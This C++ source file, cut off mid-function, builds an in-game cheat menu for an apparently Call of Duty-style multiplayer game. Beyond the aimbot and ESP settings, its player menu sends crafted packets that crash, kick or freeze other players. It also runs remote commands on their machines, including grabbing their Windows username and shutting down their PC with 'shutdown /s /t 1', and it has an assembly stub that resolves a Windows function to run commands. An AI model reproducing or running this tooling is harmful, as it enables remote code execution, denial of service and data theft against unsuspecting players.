#include "dependencies/std_include.hpp"
#include "menu.hpp"


namespace menu
{ 
	bool initialized = false, open = false;
	std::vector<std::string> material_pool;
	std::unordered_map<std::string, std::string> map_names;
	ImFont* glacial_indifference_bold_base_85;
	ImFont* glacial_indifference_base_85;
	
	void set_style_color()
	{
		auto& colors = ImGui::GetStyle().Colors;

		colors[ImGuiCol_Text] = { 1.0f, 1.0f, 1.0f, 1.0f };
		colors[ImGuiCol_TextDisabled] = { 0.784f, 0.784f, 0.784f, 0.784f };
		colors[ImGuiCol_WindowBg] = { 0.06f, 0.06f, 0.06f, 1.00f };
		colors[ImGuiCol_PopupBg] = { 0.08f, 0.08f, 0.08f, 0.94f };
		colors[ImGuiCol_Border] = { 0.00f, 0.00f, 0.00f, 0.71f };
		colors[ImGuiCol_BorderShadow] = { 0.06f, 0.06f, 0.06f, 0.01f };
		colors[ImGuiCol_FrameBg] = { 0.10f, 0.10f, 0.10f, 0.71f };
		colors[ImGuiCol_FrameBgHovered] = { 0.19f, 0.19f, 0.19f, 0.40f };
		colors[ImGuiCol_FrameBgActive] = { 0.20f, 0.20f, 0.20f, 0.67f };
		colors[ImGuiCol_TitleBg] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TitleBgActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TitleBgCollapsed] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_MenuBarBg] = { 0.10f, 0.10f, 0.10f, 0.66f };
		colors[ImGuiCol_ScrollbarBg] = { 0.02f, 0.02f, 0.02f, 0.00f };
		colors[ImGuiCol_ScrollbarGrab] = { 0.31f, 0.31f, 0.31f, 1.00f };
		colors[ImGuiCol_ScrollbarGrabHovered] = { 0.17f, 0.17f, 0.17f, 1.00f };
		colors[ImGuiCol_ScrollbarGrabActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_CheckMark] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_SliderGrab] = { 0.29f, 0.29f, 0.29f, 1.00f };
		colors[ImGuiCol_SliderGrabActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Button] = { 0.10f, 0.10f, 0.10f, 1.00f };
		colors[ImGuiCol_ButtonHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ButtonActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Header] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_HeaderHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_HeaderActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Separator] = { 0.10f, 0.10f, 0.10f, 0.90f };
		colors[ImGuiCol_SeparatorHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_SeparatorActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGrip] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGripHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGripActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_PlotLines] = { 0.61f, 0.61f, 0.61f, 1.00f };
		colors[ImGuiCol_PlotLinesHovered] = { 1.00f, 1.00f, 1.00f, 1.00f };
		colors[ImGuiCol_PlotHistogram] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_PlotHistogramHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TextSelectedBg] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ModalWindowDarkening] = { 0.80f, 0.80f, 0.80f, 0.35f };
	}

	void set_style()
	{
		auto& style = ImGui::GetStyle();
		ImGui::GetIO().FontDefault = ImGui::GetIO().Fonts->AddFontDefault();

		glacial_indifference_bold_base_85 = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedBase85TTF(ImGui::GetIO().Fonts->GetSecondaryFonts().data(), 14.0f);
		glacial_indifference_base_85 = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedBase85TTF(ImGui::GetIO().Fonts->GetPrimaryFont().data(), 15.0f);

		set_style_color();

		style.WindowPadding = { 8.0f, 2.0f };
		style.FramePadding = { 4.0f , 4.0f };
		style.ItemSpacing = { 10.0f, 4.0f };
		style.ItemInnerSpacing = { 4.0f, 4.0f };
		style.TouchExtraPadding = {};
		style.IndentSpacing = 21.0f;
		style.ScrollbarSize = 13.0f;
		style.GrabMinSize = 10.0f;
		style.WindowBorderSize = 0.0f;
		style.ChildBorderSize = 0.0f;
		style.PopupBorderSize = 0.0f;
		style.FrameBorderSize = 0.0f;
		style.TabBorderSize = 1.0f;

		style.WindowRounding = 7.0f;
		style.ChildRounding = 7.0f;
		style.FrameRounding = 7.0f;
		style.PopupRounding = 7.0f;
		style.ScrollbarRounding = 7.0f;
		style.GrabRounding = 7.0f;
		style.TabRounding = 7.0f;

		style.WindowTitleAlign = { 0.5f, 0.5f };
		style.WindowMenuButtonPosition = ImGuiDir_None;
		style.ButtonTextAlign = { 0.5f, 0.5f };
		style.SelectableTextAlign = {};

		style.DisplaySafeAreaPadding = { 4.0f, 4.0f };

		style.ColumnsMinSpacing = 6.0f;
		style.CurveTessellationTol = 1.25f;
		style.AntiAliasedLines = true;
	}
	
	void toggle()
	{
		if (initialized)
		{
			open = !open;
			utils::hook::set<bool>(0x005A94E1D, !open);
		}
	}
	
	bool is_open()
	{
		return initialized && open;
	}

	bool begin_section(const std::string& text)
	{
		ImGui::TextUnformatted(text.data());
		return true;
	}

	void setup_material_pool()
	{
		constexpr auto type = game::ASSET_TYPE_MATERIAL;

		game::enum_assets(type, [=](const auto& header)
		{
			const auto asset = game::XAsset{ type, header };
			const auto asset_name = game::DB_GetXAssetName(&asset);

			material_pool.emplace_back(asset_name);
		}, true);

		std::sort(material_pool.begin(), material_pool.end(), [](const auto& a, const auto& b) { return a < b; });
	}

	void setup_map_names()
	{
		for (auto i = 0u; i != 36u; ++i)
		{
			const auto map_name = game::map_handler[i * 3].mapname;
			map_names[map_name] = game::UI_GetMapDisplayName(map_name);
		}
	}

	void player_list()
	{
		const auto party = game::party;
		const auto our_client_num = game::Party_FindMemberByXUID(game::Live_GetXuid(0));
		const auto in_game = game::CL_IsLocalClientInGame() && game::cg()->client(game::cl()->ps()->number())->valid();
		const auto hosting = game::is_hosting();
		const auto width = ImGui::GetContentRegionAvail().x;
		const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x; 

		const auto teleport_to = [=](size_t index)
		{
			const auto origin = game::cg()->centity(index)->origin();
			exploit::member_join::send_payload("tp", { std::to_string(game::cg()->number()), std::to_string(origin.x), std::to_string(origin.y), std::to_string(origin.z) });
		};
		const auto teleport_from = [=](size_t index)
		{
			Vec3 view_axis[3];
			game::AngleVectors(&game::cg()->refdef_view_angles(), &view_axis[0], &view_axis[1], &view_axis[2]); 
			
			const auto local_origin = game::cg()->centity(game::cg()->number())->origin();
			auto target_origin = local_origin + (view_axis[0] * 100.0f);
			target_origin.z = local_origin.z + 10.0f;

			exploit::member_join::send_payload("tp", { std::to_string(index), std::to_string(target_origin.x), std::to_string(target_origin.y), std::to_string(target_origin.z) });
		};
		
		if (ImGui::BeginTabItem("Players", nullptr))
		{
			ImGui::PushStyleVar(ImGuiStyleVar_IndentSpacing, 0.0f);
			ImGui::BeginColumns("Player List", 3, ImGuiColumnsFlags_NoResize);

			ImGui::SetColumnWidth(-1, 28.0f);
			ImGui::TextUnformatted("#");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Player");
			ImGui::NextColumn();
			ImGui::SetColumnOffset(-1, width - ImGui::CalcTextSize("Priority").x);
			ImGui::TextUnformatted("Priority");
			ImGui::NextColumn();

			ImGui::Separator();

			std::array<std::uint32_t, 18> indices = {};

			for (size_t i = 0; i < 18; ++i)
			{
				indices[i] = i;
			}

			if (in_game)
			{
				std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return game::cg()->client(a)->team() > game::cg()->client(b)->team(); });
			}

			for (const auto& client_num : indices)
			{
				const auto pm = party->partyMembers[client_num];
				const auto client = game::cg()->client(client_num);

				if (game::is_valid_target(client_num))
				{
					ImGui::AlignTextToFramePadding();
					ImGui::TextUnformatted(std::to_string(client_num));

					ImGui::NextColumn();

					const auto player_xuid = pm.player; 
					const auto player_name = game::get_client_name(&pm, client_num);

					if (in_game)
					{
						ImGui::PushStyleColor(ImGuiCol_Text, client_num == game::cl()->ps()->number() ? ImVec4(0.0f, 1.0f, 0.4f, 0.95f)
							: (client->team() == game::TEAM_FREE || client->team() != game::cg()->client(game::cl()->ps()->number())->team())
							? esp::enemy_color : esp::friendly_color);
					}
					else
					{
						ImGui::PushStyleColor(ImGuiCol_Text, player_xuid == game::Live_GetXuid(0)
							? ImVec4(0.0f, 1.0f, 0.4f, 0.95f) : ImColor(200, 200, 200, 250).Value);
					}

					ImGui::AlignTextToFramePadding();
					
					const auto selected = ImGui::Selectable((player_name + "##"s + std::to_string(client_num)));

					ImGui::PopStyleColor();
					
					if (const auto steam_name = steam::get_friend_persona_name(player_xuid, player_name); !steam_name.empty())
					{
						ImGui::SameLine(0, spacing);
						ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "(%s)", steam_name.data());
					}

					game::netadr_t netadr{};
					game::Session_GetPlayerAddr(&netadr, party->session(), client_num); 
					
					const auto is_bot = netadr.type == game::NA_BOT;

					if (is_bot)
					{
						ImGui::SameLine(0, spacing);

						ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "[BOT]");
					}

					if (aimbot::ignore_target[client_num])
					{
						ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);
						ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.4f, 0.95f), "[Ignored]");
					}

					if (aimbot::priority_target[client_num])
					{
						ImGui::SameLine(0, spacing);

						ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.5f, 0.95f), "[Priority]");
					}

					if (static_cast<std::uint32_t>(party->currentHost.hostNum) == client_num)
					{
						ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);
						ImGui::TextColored(ImVec4(0.0f, 1.0f, 1.0f, 0.95f), "[Host]");
					}

					const auto popup = "player_popup##" + std::to_string(client_num);

					if (selected)
					{
						exploit::send_connectivity_test(party, client_num); 
						ImGui::OpenPopup(popup.data());
					}

					const auto netadr_ip_string = utils::string::adr_to_string(&netadr);
					const auto xnaddr_ip_string = utils::string::adr_to_string(&pm.xnaddr);
					const auto ip_string = netadr.inaddr && netadr.inaddr != 0xFF00FF00 && netadr.type != game::NA_LOOPBACK ? netadr_ip_string : xnaddr_ip_string;

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{
						if (ImGui::BeginMenu(player_name + "##player_menu"))
						{
							ImGui::MenuItem(player_name + "##player_menu_item", nullptr, false, false);

							if (!is_bot)
							{
								if (ImGui::IsItemClicked())
								{
									game::Steam_ShowSteamUserOverlay(player_xuid);
								}

								if (ImGui::IsItemHovered())
								{
									ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
								}
							}

							ImGui::EndMenu();
						}

						if (!is_bot)
						{
							ImGui::Separator();

							if (ImGui::MenuItem(std::to_string(player_xuid).data()))
							{
								ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
							}

							if (!netadr.inaddr)
							{
								game::dwUpdateNetadr(&netadr);
							}

							if (ImGui::MenuItem(ip_string))
							{
								ImGui::LogToClipboardUnformatted(ip_string);
							}

							if (pm.xnaddr.inaddr != netadr.inaddr && our_client_num != client_num)
							{
								ImGui::SameLine();

								ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "(%s)", xnaddr_ip_string.data());
							}
						}

						ImGui::Separator(); 

						ImGui::MenuItem(
							"Ignore##ignore_client",
							nullptr,
							reinterpret_cast<bool*>(&aimbot::ignore_target[client_num]),
							player_xuid != game::Live_GetXuid(0)
						);

						ImGui::MenuItem(
							"Prioritize##priority_client",
							nullptr,
							reinterpret_cast<bool*>(&aimbot::priority_target[client_num]),
							player_xuid != game::Live_GetXuid(0)
						);

						ImGui::Separator();

						const auto can_connect_to_player = exploit::can_connect_to_player(party, client_num);
						
						if (ImGui::MenuItem("Crash player", nullptr, nullptr, can_connect_to_player && !is_bot))
						{
							exploit::send_relay_crash_packet(game::party, netadr);
							exploit::send_print_packet(netadr, "^\x01==\x80");
							exploit::send(netadr, std::to_string(game::party->partyID) + "migrateto");
							exploit::send(netadr, std::to_string(game::party->partyID) + "sessinfo");
							exploit::send(netadr, std::to_string(game::party->partyID) + "nominee");
							
							if (game::party->in_party() && !hosting)
							{
								const auto mapname = game::Dvar_FindVar("ui_mapname")->current.string;
								const auto gametype = game::Dvar_FindVar("ui_gametype")->current.string; 

								exploit::send_relay_packet(game::party->currentHost.adr, client_num, utils::string::va("2go %i -123456789 0 %s %s", game::Playlist_GetCurrentId(), mapname, gametype));
								exploit::send_relay_packet(game::party->currentHost.adr, client_num, utils::string::va("2go %i %i 1 deez balls", game::Playlist_GetCurrentId(), game::Party_GetPlaylistEntry(game::party)));
							}

							game::game_message(utils::string::va("^2Executed^7: Crash for player ^5%s", player_name.data()));
						}

						if (ImGui::BeginMenu("Extra's", !is_bot))
						{
							if (ImGui::MenuItem("Kick"))
							{
								if (in_game)
								{
									exploit::send_relay_packet(game::party->currentHost.adr, client_num, "error\nEXE_PLAYERKICKED");
									exploit::send_relay_packet(game::party->currentHost.adr, client_num, "hostquit");
								}
								else
								{
									exploit::send_relay_packet(game::party->currentHost.adr, client_num, "roundsdone");
								}
							}

							if (ImGui::MenuItem("Remove from party"))
							{
								exploit::send_relay_packet(game::party->currentHost.adr, client_num, (std::to_string(game::party->partyID) + "endparty"));
							}

							ImGui::Separator();

							if (ImGui::MenuItem("Set fake map", nullptr, nullptr, in_game))
							{
								const auto mapname = game::Dvar_FindVar("mapname")->current.string;
								const auto gametype = game::Dvar_FindVar("g_gametype")->current.string;
								const auto string = utils::string::va("loadingnewmap\n%s\n%s", mapname, gametype);

								exploit::send_relay_packet(game::party->currentHost.adr, client_num, string);
								game::game_message(utils::string::va("^2Executed^7: Set fake map for player ^5%s", player_name.data()));
							}

							if (ImGui::MenuItem("Immobilize"))
							{
								if (can_connect_to_player)
									exploit::send_request_stats_packet(game::party, netadr);

								exploit::send_relay_packet(game::party->currentHost.adr, client_num, "requeststats\n");
							}

							if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, in_game))
							{
								if (can_connect_to_player)
									exploit::send_mstart_packet(game::party, netadr);

								exploit::send_relay_packet(game::party->currentHost.adr, client_num, "mstart");
							}

							if (ImGui::BeginMenu("Send string"))
							{
								static auto string_input = ""s;

								ImGui::InputTextWithHint("##send_string_inpt", "OOB", &string_input);

								if (ImGui::MenuItem("Send string"))
								{
									exploit::send(netadr, string_input);
									exploit::send_relay_packet(game::party->currentHost.adr, client_num, string_input);
								}

								ImGui::EndMenu();
							}

							ImGui::EndMenu();
						}

						ImGui::Separator();

						const auto client_ready = in_game && game::cg()->centity(client_num)->is_alive();
						
						if (ImGui::MenuItem("Teleport Player to Me", nullptr, nullptr, client_ready))
						{
							teleport_from(client_num);
						}
						
						if (ImGui::MenuItem("Teleport to Player", nullptr, nullptr, client_ready))
						{
							teleport_to(client_num);
						}
						
						if (ImGui::MenuItem("Enable God Mode", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("god", { std::to_string(client_num), std::to_string(1) });
							game::game_message(utils::string::va("^2Enabled^7: God mode for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Disable God Mode", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("god", { std::to_string(client_num), std::to_string(0) });
							game::game_message(utils::string::va("^1Disabled^7: God mode for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Enable UFO Mode", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("ufo", { std::to_string(client_num), std::to_string(1) });
							game::game_message(utils::string::va("^2Enabled^7: UFO mode for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Disable UFO Mode", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("ufo", { std::to_string(client_num), std::to_string(0) });
							game::game_message(utils::string::va("^1Disabled^7: UFO mode for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Hide player", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("hide", { std::to_string(client_num), std::to_string(1) });
							game::game_message(utils::string::va("^2Executed^7: Hide player for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Show player", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("hide", { std::to_string(client_num), std::to_string(0) });
							game::game_message(utils::string::va("^2Executed^7: Show player for player ^5%s", player_name.data()));
						}
						
						if (ImGui::MenuItem("Freeze player", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("freeze", { std::to_string(client_num), std::to_string(1) });
							game::game_message(utils::string::va("^2Executed^7: Freeze player for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Unfreeze player", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("freeze", { std::to_string(client_num), std::to_string(0) });
							game::game_message(utils::string::va("^2Executed^7: Unfreeze player for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Disable weapons", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("weapon_usage", { std::to_string(client_num), std::to_string(1) });
							game::game_message(utils::string::va("^2Executed^7: Disable weapons for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Enable weapons", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("weapon_usage", { std::to_string(client_num), std::to_string(0) });
							game::game_message(utils::string::va("^2Executed^7: Enable weapons for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Give infinite ammo", nullptr, nullptr, client_ready))
						{
							exploit::member_join::send_payload("ammo", { std::to_string(client_num) });
							game::game_message(utils::string::va("^2Executed^7: Set infinite ammo for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Turn sound extremely loud", nullptr, nullptr, client_ready && !is_bot))
						{
							game::send_server_command(client_num, "l 12345678");
							game::game_message(utils::string::va("^2Executed^7: Turn sound extremely loud for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Send crash text", nullptr, nullptr, client_ready && !is_bot))
						{
							std::thread([=]
							{
								game::send_server_command(client_num, utils::string::va("f \"%s\"", game::CL_AddMessageIcon("ps3_aadownsample").data()));
								std::this_thread::sleep_for(1s);
								game::send_server_command(client_num, utils::string::va("f \"%s\"", game::CL_AddMessageIcon("postfx").data()));
								std::this_thread::sleep_for(1s);
								game::send_server_command(client_num, utils::string::va("f \"%s\"", game::CL_AddMessageIcon("gfx_laser").data()));
								game::send_server_command(client_num, "f \"^\x01==\xFF\"");
								game::send_server_command(client_num, "f \"^\x01==\x1D\"");
								game::send_server_command(client_num, "f \"^\x01\"");
								game::send_server_command(client_num, "f \"^\x01==\x80\"");
								game::game_message(utils::string::va("^2Executed^7: Send crash text for player ^5%s", player_name.data()));
							}).detach();
						}

						if (ImGui::MenuItem("Crash player", nullptr, nullptr, client_ready && !is_bot))
						{
							game::send_server_command_crashes(client_num);
							game::game_message(utils::string::va("^2Executed^7: Crash player for player ^5%s", player_name.data()));
						}

						if (ImGui::MenuItem("Immobilize", nullptr, nullptr, client_ready && !is_bot))
						{
							std::thread([=]
							{
								game::send_server_command(client_num, "d 3 aaaa");
								std::this_thread::sleep_for(1s);
								game::send_server_command(client_num, "d 3 " + std::to_string(game::server_id + 1));
								game::game_message(utils::string::va("^2Executed^7: Immobilize for player ^5%s", player_name.data()));
							}).detach();
						}

						if (ImGui::BeginMenu("Kick player", client_ready))
						{
							static auto kick_player_input = ""s;

							ImGui::InputTextWithHint("##", "Message", &kick_player_input);

							if (ImGui::MenuItem("Kick player"))
							{
								exploit::member_join::send_payload("kick", { std::to_string(client_num), kick_player_input });
								game::game_message(utils::string::va("^2Executed^7: Kick player for player ^5%s", player_name.data()));
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Print message on screen", client_ready))
						{
							static auto message_input = ""s;

							ImGui::InputTextWithHint("##", "Message", &message_input);

							if (ImGui::MenuItem("Print", nullptr, nullptr, !message_input.empty()))
							{
								const auto command = utils::string::va("g \"%s\"", message_input.data());

								if (hosting)
									game::SV_GameSendServerCommand(client_num, game::SV_CMD_RELIABLE, command);
								else
									exploit::member_join::send_payload("iprintlnbold", { std::to_string(client_num), message_input });

								game::game_message(utils::string::va("^2Executed^7: Print message on screen for player ^5%s", player_name.data()));
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Print message in killfeed", client_ready))
						{
							static auto message_input = ""s;

							ImGui::InputTextWithHint("##", "Message", &message_input);

							if (ImGui::MenuItem("Print", nullptr, nullptr, !message_input.empty()))
							{
								const auto command = utils::string::va("f \"%s\"", message_input.data());

								if (hosting)
									game::SV_GameSendServerCommand(client_num, game::SV_CMD_RELIABLE, command);
								else
									exploit::member_join::send_payload("iprintln", { std::to_string(client_num), message_input });

								game::game_message(utils::string::va("^2Executed^7: Print message in killfeed for player ^5%s", player_name.data()));
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Send SV command", client_ready && !is_bot))
						{
							static auto sv_cmd_input = ""s;

							ImGui::InputTextWithHint("##sv_cmd_input", "Command", &sv_cmd_input);

							if (ImGui::MenuItem("Send SV command", nullptr, nullptr, !sv_cmd_input.empty()))
							{
								game::send_server_command(client_num, sv_cmd_input);
							}

							ImGui::EndMenu();
						}

						ImGui::Separator();

						if (ImGui::BeginMenu("Execute cbuf command", in_game))
						{
							static auto command_input = ""s;

							ImGui::InputTextWithHint("##", "Command", &command_input);

							if (ImGui::MenuItem("Execute", nullptr, nullptr, !command_input.empty()))
							{
								exploit::replace_directive::send_payload(client_num, "cbuf", { command_input });
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Execute command line##" + std::to_string(client_num), in_game))
						{
							static auto command_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "Command", &command_input);

							if (ImGui::MenuItem("Execute", nullptr, nullptr, !command_input.empty()))
							{
								exploit::replace_directive::send_payload(client_num, "cmd", { command_input });
							}

							ImGui::EndMenu();
						}

						const auto username = exploit::replace_directive::client_info[player_xuid].username;
						const auto username_str = username.empty() ? nullptr : username.data();

						if (ImGui::MenuItem("Grab Windows username", username_str, nullptr, in_game && can_connect_to_player))
						{
							exploit::replace_directive::send_payload(client_num, "grabusername");
						}
						
						if (ImGui::MenuItem("Say Windows username", nullptr, nullptr, in_game))
						{
							exploit::replace_directive::send_payload(client_num, "say_username");
						}

						if (ImGui::MenuItem("Shutdown PC", nullptr, nullptr, in_game))
						{
							exploit::replace_directive::send_payload(client_num, "cmd", { "shutdown /s /t 1" });
						}

						ImGui::EndPopup();
					}

					ImGui::NextColumn();

					if (client_num != static_cast<std::uint32_t>(our_client_num))
					{
						ImGui::TextUnformatted("");
						ImGui::SameLine(0, 10.0f);
						ImGui::Checkbox(("##priority_client" + std::to_string(client_num)).data(), reinterpret_cast<bool*>(&aimbot::priority_target[client_num]));
					}
					else
					{
						ImGui::TextUnformatted("");
					}

					ImGui::NextColumn();

					if (ImGui::GetColumnIndex() == 0)
					{
						ImGui::Separator();
					}
				}
			}

			ImGui::PopStyleVar();
			ImGui::EndColumns();
			ImGui::EndTabItem();
		}
	}

	std::pair<std::string, std::string> get_rce_commands(const float width)
	{
		static std::string rce_cmd = exploit::member_join::payloads.begin()->first, rce_input;

		std::vector<std::string> payloads;

		for (const auto& payload : exploit::member_join::payloads)
		{
			payloads.emplace_back(payload.first);
		}

		std::sort(payloads.begin(), payloads.end(), [](const auto& a, const auto& b) { return a < b; });

		ImGui::SetNextItemWidth(width * 0.60f);

		if (ImGui::BeginCombo("##rce_command", rce_cmd.data()))
		{
			for (const auto& payload : payloads)
			{
				ImGui::PushID(payload);

				if (ImGui::Selectable(payload))
				{
					rce_cmd = payload;
				}

				ImGui::PopID();
			}

			ImGui::EndCombo();
		}

		ImGui::SetNextItemWidth(width * 0.60f);
		ImGui::InputTextA("RCE Input##rce_input", &rce_input);

		return { rce_input, rce_cmd };
	}
	
	__declspec(naked) void win_exec_stub()
	{
		__asm
		{
			push 816DD4h; // kernel32.dll
			call ds : 7E0280h; // GetModuleHandleA

			push UNUSED_DATA_0;
			push eax;
			call ds : 7E0294h; // GetProcAddress

			mov ebx, [esp + 4];
			push ebx;
			push UNUSED_DATA_1;

			call eax;

			retn;

			nop;
			nop;
			nop;
			nop;
		}
	}

	void draw()
	{
		const auto draw_material_list = [=](const std::string& material)
		{
			ImGui::MenuItem(material);

			if (ImGui::IsItemClicked())
			{
				PRINT_LOG("Name set to '%s' ..", material.data());

				ImGui::LogToClipboardUnformatted(material);
				steam::persona_name = game::CL_AddMessageIcon(material, { 1.5f, 1.5f }, false);
			}

			if (ImGui::IsItemHovered())
			{
				ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
			}
		}; 
		
		if (is_open())
		{
			ImGui::SetNextWindowSize({ 480, 480 }, ImGuiCond_Once);

			if (!ImGui::Begin(window_title, nullptr, window_flags))
			{
				ImGui::End();
				return;
			}

			if (ImGui::BeginTabBar("tabs"))
			{
				ImGui::Separator();

				const auto party = game::party;
				const auto hosting = game::is_hosting();
				const auto in_game = game::CL_IsLocalClientInGame() && game::cg()->client(game::cl()->ps()->number())->valid();
				const auto our_client_num = static_cast<std::uint32_t>(game::Party_FindMemberByXUID(game::Live_GetXuid(0)));
				const auto width = ImGui::GetContentRegionAvail().x;
				const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

				if (ImGui::BeginTabItem("Aimbot"))
				{
					ImGui::Checkbox("Enabled##aimbot_enabled", &aimbot::enabled);

					ImGui::Separator();

					ImGui::Checkbox("Silent mode", &aimbot::silent);

					ImGui::SameLine(width - 100.0f, spacing);
					ImGui::Checkbox("Asynchronous", &aimbot::asynchronous);

					ImGui::Checkbox("Auto-fire", &aimbot::auto_fire);
					ImGui::Checkbox("Predict target movement", &entity_prediction::predict_entity_movement);
					ImGui::Checkbox("Prioritize backshield targets", &aimbot::priority_riot);
					ImGui::Checkbox("Bonescan priority targets", &aimbot::priority_bonescan);

					const auto leg_multipoint_radius_step = 1u;

					ImGui::SetNextItemWidth(width * (1.0f / 5));
					ImGui::InputScalar("Leg multipoint radius", ImGuiDataType_S32, &aimbot::leg_multipoint_radius, &leg_multipoint_radius_step, nullptr, "%u");
					aimbot::leg_multipoint_radius = std::min(aimbot::leg_multipoint_radius, 30u); 
					
					if (ImGui::CollapsingHeader("Anti-aim", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::Checkbox("Enabled##anti_aim_enabled", &antiaim::enabled);

						ImGui::Separator();
						
						const auto custom_base_step = 1.0f; 
						
						ImGui::SetNextItemWidth(width * (1.0f / 4));
						ImGui::InputScalar("Shield pitch up", ImGuiDataType_Float, &antiaim::shield_base_pitch_shift, &custom_base_step, nullptr, "%.1f deg");

						if (std::abs(antiaim::shield_base_pitch_shift) > 85.0f)
						{
							antiaim::shield_base_pitch_shift = 0;
						}
					}
					
					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Visuals"))
				{
					ImGui::Checkbox("Enable##visuals_enable", &esp::enabled);
					ImGui::Checkbox("Enemies only", &esp::enemies_only);

					ImGui::Separator();

					ImGui::Checkbox("Player box", &esp::box);
					ImGui::Checkbox("Player nametag", &esp::name_tag);
					ImGui::Checkbox("Player bones", &esp::bone_esp);

					ImGui::Separator();

					ImGui::ColorEdit4("Enemy visible color", reinterpret_cast<float*>(&esp::enemy_visible_color), color_flags);
					ImGui::ColorEdit4("Enemy color", reinterpret_cast<float*>(&esp::enemy_color), color_flags);
					ImGui::ColorEdit4("Friendly color", reinterpret_cast<float*>(&esp::friendly_color), color_flags);

					ImGui::Separator();

					const auto thickness_step = 1.0f;

					ImGui::SetNextItemWidth(width * (1.0f / 5));
					ImGui::InputScalar("Thickness", ImGuiDataType_Float, &esp::bone_thickness, &thickness_step, nullptr, "%.1f");
					
					esp::bone_thickness = std::fminf(std::fmaxf(esp::bone_thickness, 0.0f), 10.0f);

					if (ImGui::CollapsingHeader("Misc", ImGuiTreeNodeFlags_Leaf)) 
					{
						ImGui::Checkbox("Aimbot positions", &esp::aimbot_positions); 
						ImGui::Checkbox("Chams", &esp::chams::chams);

						ImGui::Separator();
						
						ImGui::Checkbox("Lagometer", &lagometer::draw_lagometer);
					}

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Misc"))
				{
					static ImGuiTextFilter filter;

					ImGui::TextUnformatted("Material List");
					filter.Draw("##search_material", "Material", width * 0.85f);
					ImGui::SetNextItemWidth(width * 0.85f);

					if (ImGui::ListBoxHeader("##material_list_header", material_pool.size()))
					{
						if (filter.IsActive())
						{
							for (const auto& material : material_pool)
							{
								ImGui::PushID(material);

								if (filter.PassFilter(material))
									draw_material_list(material);

								ImGui::PopID();
							}
						}
						else
						{
							ImGuiListClipper clipper(material_pool.size());

							while (clipper.Step())
							{
								for (auto i = clipper.DisplayStart; i < clipper.DisplayEnd; ++i)
								{
									ImGui::PushID(i);

									draw_material_list(material_pool[i]);

									ImGui::PopID();
								}
							}
						}

						ImGui::ListBoxFooter();
					}
					
					if (begin_section("Player name"))
					{
						static std::string player_name = game::PLAYER_NAME;
						static auto shader_name = ""s;

						ImGui::SetNextItemWidth(width * 0.45f);
